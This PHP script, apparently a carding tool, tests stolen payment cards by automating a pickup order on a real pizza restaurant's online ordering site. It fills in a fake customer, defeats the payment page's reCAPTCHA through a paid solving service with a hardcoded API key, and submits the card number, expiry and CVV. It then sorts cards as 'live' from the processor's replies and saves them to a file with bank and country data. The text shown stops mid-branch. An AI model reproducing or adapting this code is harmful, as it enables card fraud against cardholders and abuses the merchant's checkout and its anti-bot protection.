<?php

set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];


$cookie = __DIR__ . "/pizza.txt";
if (file_exists($cookie)) {
  unlink($cookie);
}

function saveGG($approvedCard) {

    file_put_contents('lives.txt', $approvedCard, FILE_APPEND);

  }
  
function colorir($text, $colorCode) {

    return "\e[{$colorCode}m$text\e[0m";

  }



function getStr($string, $start, $end){
    $str = explode($start, $string);
    if(isset($str[1])){
        $str = explode($end, $str[1]);
        return $str[0];
    }
    return '';
}


function solveRecaptchaCapGuru($siteKey, $url, $apiKey)
{
    $apiUrl = "http://api.cap.guru/in.php";
    $getResponseUrl = "http://api.cap.guru/res.php";

    $requestData = [
        'key' => $apiKey,
        'method' => 'userrecaptcha',
        'googlekey' => $siteKey,
        'pageurl' => $url,
        'json' => 1
    ];

    $response = sendRequest($apiUrl, $requestData);

    $apiResponse = json_decode($response, true);

    if ($apiResponse['status'] !== 1) {
        echo "Erro no captcha";
    }

    $captchaId = $apiResponse['request'];

    while (true) {
        sleep(10);

        $result = sendRequest($getResponseUrl, [
            'key' => $apiKey,
            'action' => 'get',
            'id' => $captchaId,
            'json' => 1
        ]);

        $resultArray = json_decode($result, true);

        if ($resultArray['status'] === 1) {
            $captchaResponse = $resultArray['request'];
            return $captchaResponse;
        } elseif ($resultArray['request'] !== 'CAPCHA_NOT_READY') {
            echo "captcha nao esta pronto, aguarde";
        }
    }
}

function sendRequest($url, $data)
{
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data),
        ],
    ];

    $context = stream_context_create($options);
    return file_get_contents($url, false, $context);
}






$ano2 = substr($ano, -2);
$card_info = "$cc|$mes|$ano|$cvv";



$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');

  $dominios = array("gmail.com", "hotmail.com", "outlook.com", "yahoo.com");

  $data = json_decode($get, true);
  $primeiroNome = $data['results'][0]['name']['first'];
  $sobrenome = $data['results'][0]['name']['last'];
  $dominioAleatorio = $dominios[array_rand($dominios)];
  $email = $primeiroNome . '_'.rand(11,99).'' . substr($sobrenome, 0, 4) . '@' . $dominioAleatorio;







$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://frederick.paisanospizza.com/ws/integrated/v1/ordering/order',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_COOKIEJAR => $cookie,
  CURLOPT_COOKIEFILE => $cookie,
  CURLOPT_HEADER => true,
  CURLOPT_ENCODING => 'gzip',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Accept: application/expanded+json',
    'Accept-Encoding: gzip',
    'Content-Type: application/json',
    'X-Requested-With: XMLHttpRequest',
    'X-FTS-CLIENT: latte',
    'Origin: https://frederick.paisanospizza.com',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Referer: https://frederick.paisanospizza.com/ordering/home',
    'Accept-Language: pt-BR,pt;q=0.9',
  ],
]);

$response = curl_exec($curl);
preg_match("/XSRF-TOKEN=([^;]+)/", $response ,$matches) . PHP_EOL;
if ($matches) { 

$xsrfTokenValue = $matches[1];

}


$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://frederick.paisanospizza.com/ws/integrated/v1/ordering/order',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_COOKIEJAR => $cookie,
  CURLOPT_COOKIEFILE => $cookie,
  CURLOPT_ENCODING => 'gzip',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"orderType":"Pickup","deferTime":"2024-03-11T11:00:00.000-0400","isMobileSource":false}',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Accept: application/expanded+json',
    'Accept-Encoding: gzip',
    'Content-Type: application/json',
    'X-XSRF-TOKEN: '.$xsrfTokenValue,
    'X-Requested-With: XMLHttpRequest',
    'X-FTS-CLIENT: latte',
    'Origin: https://frederick.paisanospizza.com',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Referer: https://frederick.paisanospizza.com/ordering/home',
    'Accept-Language: pt-BR,pt;q=0.9',
  ],
]);

$response = curl_exec($curl);

$data = json_decode($response, true);

$orderId = $data["orderId"] . PHP_EOL;
    



$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://frederick.paisanospizza.com/ws/integrated/v1/ordering/audits',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_COOKIEJAR => $cookie,
  CURLOPT_COOKIEFILE => $cookie,
  CURLOPT_ENCODING => 'gzip',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"audit":"Add \\"Lg Cheese\\" item to order button clicked"}',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Accept: application/expanded+json',
    'Accept-Encoding: gzip, deflate, br, zstd',
    'Content-Type: application/json',
    'X-XSRF-TOKEN: '.$xsrfTokenValue,
    'X-Requested-With: XMLHttpRequest',
    'X-FTS-CLIENT: latte',
    'Origin: https://frederick.paisanospizza.com',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Referer: https://frederick.paisanospizza.com/ordering/menu/Pizzas',
    'Accept-Language: pt-BR,pt;q=0.9',
  ],
]);

$response = curl_exec($curl);


$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://frederick.paisanospizza.com/ws/integrated/v1/ordering/order/items',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_COOKIEJAR => $cookie,
  CURLOPT_COOKIEFILE => $cookie,
  CURLOPT_ENCODING => 'gzip',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"category":"Pizza","item":"Cheese","size":"Lg","quantity":1,"isUpsell":false,"choices":[{"name":"Toppings","ingredients":[{"ingredient":"Pizza Cheese","isLeftHalf":false,"isRightHalf":false,"qualifiers":[]}]},{"name":"Crust","ingredients":[{"ingredient":"New York Style","isLeftHalf":false,"isRightHalf":false,"qualifiers":[]}]},{"name":"Sauce","ingredients":[{"ingredient":"Pizza Sauce","isLeftHalf":false,"isRightHalf":false,"qualifiers":[]}]},{"name":"Instructions","ingredients":[]}]}',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Accept: application/expanded+json',
    'Accept-Encoding: gzip',
    'Content-Type: application/json',
    'X-XSRF-TOKEN: '.$xsrfTokenValue,
    'X-Requested-With: XMLHttpRequest',
    'X-FTS-CLIENT: latte',
    'Origin: https://frederick.paisanospizza.com',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Referer: https://frederick.paisanospizza.com/ordering/menu/Pizzas',
    'Accept-Language: pt-BR,pt;q=0.9',
  ],
]);

$response = curl_exec($curl);





$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://frederick.paisanospizza.com/ws/integrated/v1/ordering/audits',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_COOKIEJAR => $cookie,
  CURLOPT_COOKIEFILE => $cookie,
  CURLOPT_ENCODING => 'gzip',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"audit":"\'1 Lg Cheese\' item has been added to the order: {\\"itemId\\":1,\\"isUpsell\\":false}"}',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Accept: application/expanded+json',
    'Accept-Encoding: gzip',
    'Content-Type: application/json',
    'X-XSRF-TOKEN: '.$xsrfTokenValue,
    'X-Requested-With: XMLHttpRequest',
    'X-FTS-CLIENT: latte',
    'Origin: https://frederick.paisanospizza.com',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Referer: https://frederick.paisanospizza.com/ordering/menu/Pizzas',
    'Accept-Language: pt-BR,pt;q=0.9',
  ],
]);

$response = curl_exec($curl);

$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://frederick.paisanospizza.com/ws/integrated/v1/ordering/order',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_COOKIEJAR => $cookie,
  CURLOPT_COOKIEFILE => $cookie,
  CURLOPT_ENCODING => 'gzip',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Accept: application/expanded+json',
    'Accept-Encoding: gzip',
    'X-XSRF-TOKEN: '.$xsrfTokenValue,
    'X-Requested-With: XMLHttpRequest',
    'X-FTS-CLIENT: latte',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Referer: https://frederick.paisanospizza.com/ordering/menu/Pizzas',
    'Accept-Language: pt-BR,pt;q=0.9',
  ],
]);

$response = curl_exec($curl);

$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://frederick.paisanospizza.com/ws/integrated/v1/ordering/audits',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_COOKIEJAR => $cookie,
  CURLOPT_COOKIEFILE => $cookie,
  CURLOPT_ENCODING => 'gzip',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"audit":"Notification \\"CHECKOUT\\" button clicked."}',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Accept: application/expanded+json',
    'Accept-Encoding: gzip',
    'Content-Type: application/json',
    'X-XSRF-TOKEN: '.$xsrfTokenValue,
    'X-Requested-With: XMLHttpRequest',
    'X-FTS-CLIENT: latte',
    'Origin: https://frederick.paisanospizza.com',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Referer: https://frederick.paisanospizza.com/ordering/menu/Pizzas',
    'Accept-Language: pt-BR,pt;q=0.9',
  ],
]);

$response = curl_exec($curl);

$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://frederick.paisanospizza.com/ws/integrated/v1/ordering/audits',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_COOKIEJAR => $cookie,
  CURLOPT_COOKIEFILE => $cookie,
  CURLOPT_ENCODING => 'gzip',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"audit":"Order Tree expanded"}',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Accept: application/expanded+json',
    'Accept-Encoding: gzip',
    'Content-Type: application/json',
    'X-XSRF-TOKEN: '.$xsrfTokenValue,
    'X-Requested-With: XMLHttpRequest',
    'X-FTS-CLIENT: latte',
    'Origin: https://frederick.paisanospizza.com',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Referer: https://frederick.paisanospizza.com/ordering/menu/Pizzas',
    'Accept-Language: pt-BR,pt;q=0.9',
  ],
]);

$response = curl_exec($curl);

$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://frederick.paisanospizza.com/ws/integrated/v1/ordering/audits',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_COOKIEJAR => $cookie,
  CURLOPT_COOKIEFILE => $cookie,
  CURLOPT_ENCODING => 'gzip',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"audit":"\\"Check Out\\" button clicked"}',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Accept: application/expanded+json',
    'Accept-Encoding: gzip',
    'Content-Type: application/json',
    'X-XSRF-TOKEN: '.$xsrfTokenValue,
    'X-Requested-With: XMLHttpRequest',
    'X-FTS-CLIENT: latte',
    'Origin: https://frederick.paisanospizza.com',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Referer: https://frederick.paisanospizza.com/ordering/menu/Pizzas',
    'Accept-Language: pt-BR,pt;q=0.9',
  ],
]);

$response = curl_exec($curl);

$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://frederick.paisanospizza.com/ws/integrated/v1/ordering/order',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_COOKIEJAR => $cookie,
  CURLOPT_COOKIEFILE => $cookie,
  CURLOPT_ENCODING => 'gzip',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'PUT',
  CURLOPT_POSTFIELDS => '{"orderId":"'.$orderId.'","orderNumber":0,"donationAmount":0,"tip":0,"orderType":"Pickup","deferTime":"2024-03-11T11:00:00.000-0400","isSelfOrderSource":false,"guestCount":0}',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Accept: application/expanded+json',
    'Accept-Encoding: gzip',
    'Content-Type: application/json',
    'sec-ch-ua: "Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
    'X-XSRF-TOKEN: '.$xsrfTokenValue,
    'X-Requested-With: XMLHttpRequest',
    'X-FTS-CLIENT: latte',
    'Origin: https://frederick.paisanospizza.com',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Referer: https://frederick.paisanospizza.com/ordering/checkout/details',
    'Accept-Language: pt-BR,pt;q=0.9',
  ],
]);

$response = curl_exec($curl);



    
$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://frederick.paisanospizza.com/ws/integrated/v1/ordering/order/customer',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_COOKIEJAR => $cookie,
  CURLOPT_COOKIEFILE => $cookie,
  CURLOPT_ENCODING => 'gzip',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'PUT',
  CURLOPT_POSTFIELDS => '{"customerId":0,"firstName":"'.$primeiroNome.'","lastName":"'.$sobrenome.'","subscribe":true,"smsMarketing":false,"email":"rubenww22@gmail.com","address":{"force":false},"phone":"202-939-5666","phoneConfirmation":""}',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Accept: application/expanded+json',
    'Accept-Encoding: gzip',
    'Content-Type: application/json',
    'sec-ch-ua: "Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
    'X-XSRF-TOKEN: '.$xsrfTokenValue,
    'X-Requested-With: XMLHttpRequest',
    'X-FTS-CLIENT: latte',
    'Origin: https://frederick.paisanospizza.com',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Referer: https://frederick.paisanospizza.com/ordering/checkout/details',
    'Accept-Language: pt-BR,pt;q=0.9',
  ],
]);

$response = curl_exec($curl);



$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://frederick.paisanospizza.com/ws/integrated/v1/ordering/audits',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_COOKIEJAR => $cookie,
  CURLOPT_COOKIEFILE => $cookie,
  CURLOPT_ENCODING => 'gzip',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"audit":"Navigated to: /checkout/order-details"}',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Accept: application/expanded+json',
    'Accept-Encoding: gzip',
    'Content-Type: application/json',
    'X-XSRF-TOKEN: '.$xsrfTokenValue,
    'X-Requested-With: XMLHttpRequest',
    'X-FTS-CLIENT: latte',
    'Origin: https://frederick.paisanospizza.com',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Referer: https://frederick.paisanospizza.com/ordering/checkout/order-details',
    'Accept-Language: pt-BR,pt;q=0.9',
  ],
]);

$response = curl_exec($curl);

$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://frederick.paisanospizza.com/ws/integrated/v1/ordering/audits',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => 'gzip',
  CURLOPT_COOKIEJAR => $cookie,
  CURLOPT_COOKIEFILE => $cookie,
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"audit":"\'Credit Card\' payment has been selected"}',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Accept: application/expanded+json',
    'Accept-Encoding: gzip',
    'Content-Type: application/json',
    'X-XSRF-TOKEN: '.$xsrfTokenValue,
    'X-Requested-With: XMLHttpRequest',
    'X-FTS-CLIENT: latte',
    'Origin: https://frederick.paisanospizza.com',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Referer: https://frederick.paisanospizza.com/ordering/checkout/payment',
    'Accept-Language: pt-BR,pt;q=0.9',
  ],
]);

$response = curl_exec($curl);


$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://frederick.paisanospizza.com/ws/integrated/v1/ordering/audits',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_COOKIEJAR => $cookie,
  CURLOPT_COOKIEFILE => $cookie,
  CURLOPT_ENCODING => 'gzip',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"audit":"Navigated to: /checkout/payment"}',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Accept: application/expanded+json',
    'Accept-Encoding: gzip',
    'Content-Type: application/json',
    'X-XSRF-TOKEN: '.$xsrfTokenValue,
    'X-Requested-With: XMLHttpRequest',
    'X-FTS-CLIENT: latte',
    'Origin: https://frederick.paisanospizza.com',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Referer: https://frederick.paisanospizza.com/ordering/checkout/payment',
    'Accept-Language: pt-BR,pt;q=0.9',
  ],
]);

$response = curl_exec($curl);





$siteKey = "6LfFmCkUAAAAACfOqISvGBUOzPcXCKQvzFXK8X7y";
$url = "https://frederick.paisanospizza.com/ws/integrated/v1/ordering/order/payments/setup";
$apiKey = "5edec260c0360291e9dbd9fdc2c8961c";

$captchaResponse = solveRecaptchaCapGuru($siteKey, $url, $apiKey);




    if ($captchaResponse) {
    } else {
        echo "Falha ao obter resposta do captcha.";
    }

$jsonData = array(
    "type" => 0,
    "isMobileSource" => true,
    "recaptcha" => $captchaResponse,
);
$post = json_encode($jsonData);

$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://frederick.paisanospizza.com/ws/integrated/v1/ordering/order/payments/setup',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_COOKIEJAR => $cookie,
  CURLOPT_COOKIEFILE => $cookie,
  CURLOPT_ENCODING => 'gzip',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => $post,
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Accept: application/expanded+json',
    'Accept-Encoding: gzip',
    'Content-Type: application/json',
    'X-XSRF-TOKEN: '.$xsrfTokenValue,
    'X-Requested-With: XMLHttpRequest',
    'X-FTS-CLIENT: latte',
    'Origin: https://frederick.paisanospizza.com',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Referer: https://frederick.paisanospizza.com/ordering/checkout/payment',
    'Accept-Language: pt-BR,pt;q=0.9',
  ],
]);

$response = curl_exec($curl);


    $transactionSetupID = "";
    $jsonData = json_decode($response, true);

    if (isset($jsonData["paymentPageUrl"])) {
        parse_str(
            parse_url($jsonData["paymentPageUrl"], PHP_URL_QUERY),
            $queryParams
        );

        if (isset($queryParams["TransactionSetupID"])) {
            $transactionSetupID = $queryParams["TransactionSetupID"];
        } 

if (!empty($transactionSetupID)) {
    $url = 'https://transaction.hostedpayments.com?TransactionSetupID=' . urlencode($transactionSetupID);

  $curl = curl_init();
  curl_setopt_array($curl, [
  CURLOPT_URL => $url,
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_HEADER => true,
  CURLOPT_ENCODING => 'gzip',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding: gzip',
    'sec-fetch-site: cross-site',
    'sec-fetch-mode: navigate',
    'sec-fetch-dest: document',
    'referer: https://frederick.paisanospizza.com/',
    'accept-language: pt-BR,pt;q=0.9',
  ],
]);

$response = curl_exec($curl);

$viewState = strip_tags(getStr($response, 'name="__VIEWSTATE" id="__VIEWSTATE" value="', '"'));
$eventValidation = strip_tags(getStr($response, '__EVENTVALIDATION" value="', '"'));



$params = [
    "scriptManager" => "upFormHP|processTransactionButton",
    "__EVENTTARGET" => "processTransactionButton",
    "__EVENTARGUMENT" => "",
    "__VIEWSTATE" => $viewState,
    "__VIEWSTATEGENERATOR" => "CA0B0334",
    "__VIEWSTATEENCRYPTED" => "",
    "__EVENTVALIDATION" => $eventValidation,
    "hdnCancelled" => "",
    "cardNumber" => $cc,
    "ddlExpirationMonth" => $mes,
    "ddlExpirationYear" => $ano2,
    "CVV" => $cvv,
    "CVV_Mask" => "xxx",
    "txtBillingEditName" => "",
    "txtBillingEditAddress1" => "Street 772",
    "txtBillingEditAddress2" => "",
    "txtBillingEditCity" => "",
    "txtBillingEditState" => "",
    "txtBillingEditZip" => "10008",
    "txtBillingEditEmail" => "",
    "txtBillingEditPhone" => "",
    "hdnSwipe" => "",
    "hdnTruncatedCardNumber" => "",
    "hdnValidatingSwipeForUseDefault" => "",
    "hdnEncoded" => "",
    "__ASYNCPOST" => "true",
];

$postFields = http_build_query($params);



$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => $url,
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => 'gzip',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => $postFields,
    CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Accept-Encoding: gzip',
    'Content-Type: application/x-www-form-urlencoded',
    'x-requested-with: XMLHttpRequest',
    'x-microsoftajax: Delta=true',
    'origin: https://transaction.hostedpayments.com',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: cors',
    'referer: https://transaction.hostedpayments.com/?TransactionSetupID='.$transactionSetupID,
    'accept-language: pt-BR,pt;q=0.9',
  ],
]);

$response = curl_exec($curl);


$bin = substr($cc, 0, 6);
$file = 'bins.csv';
$searchfor = $bin;
$contents = file_get_contents($file);
$pattern = preg_quote($searchfor, '/');
$pattern = "/^.*$pattern.*\$/m";
if (preg_match_all($pattern, $contents, $matches)) {
    $encontrada = implode("\n", $matches[0]);
}
$pieces = explode(";", $encontrada);
$c = count($pieces);
if ($c == 8) {
    $pais = $pieces[4];
    $paiscode = $pieces[5];
    $banco = $pieces[2];
    $level = $pieces[3];
    $bandeira = $pieces[1];
} else {
    $pais = $pieces[5];
    $paiscode = $pieces[6];
    $level = $pieces[4];
    $banco = $pieces[2];
    $bandeira = $pieces[1];
}

$info_bin = "$pais;$paiscode;$level;$banco;$bandeira";

if (strpos($response, 'Approved') !== false) {
    echo "</span> <span class='badge badge-success'>✔ Aprovada</span> <span class='badge badge-secondary'> ".$cc."|".$mes."|".$ano."|".$cvv."</span> <span class='badge badge-dark'> ".$info_bin."</span><span class='badge badge-warning'>Retorno:</span> ➔ </span><span class='badge badge-warning'> auth 00 - NSF</span> ➔</span><span class='badge badge-dark'>@fs.network</span><br>";
    saveGG("APROVADA ➜ $card_info ➜ $info_bin ➜ NSF\n");
    usleep(100000);
    curl_close($curl);
    unlink($cookie);
    
 }elseif(strpos($response, 'Invalid Request') !== false){
echo "</span> <span class='badge badge-success'>✔ Aprovada</span> <span class='badge badge-secondary'> ".$cc."|".$mes."|".$ano."|".$cvv."</span> <span class='badge badge-dark'> ".$info_bin."</span><span class='badge badge-warning'>Retorno:</span> ➔ </span><span class='badge badge-warning'> autorized_card_sucess</span> ➔</span><span class='badge badge-dark'>@fs.network</span><br>";
saveGG("APROVADA ➜ $card_info ➜ $info_bin ➜ LIVE MASTER\n");
usleep(100000);
curl_close($curl);
unlink($cookie);
   
   
 }elseif (strpos($response, 'CVV VALUE MISMATCH') !== false) {
echo "</span> <span class='badge badge-success'>✔ Aprovada</span> <span class='badge badge-secondary'> ".$cc."|".$mes."|".$ano."|".$cvv."</span> <span class='badge badge-dark'> ".$info_bin."</span><span class='badge badge-warning'>Retorno:</span> ➔ </span><span class='badge badge-warning'> cvv_auth_failure</span> ➔</span><span class='badge badge-dark'>@fs.network</span><br>";
saveGG("APROVADA ➜ $card_info ➜ $info_bin ➜  CVV INCORRETO \n");
usleep(100000);
curl_close($curl);
unlink($cookie);
 }elseif (strpos($response, 'PLEASE RETRY') !== false) {
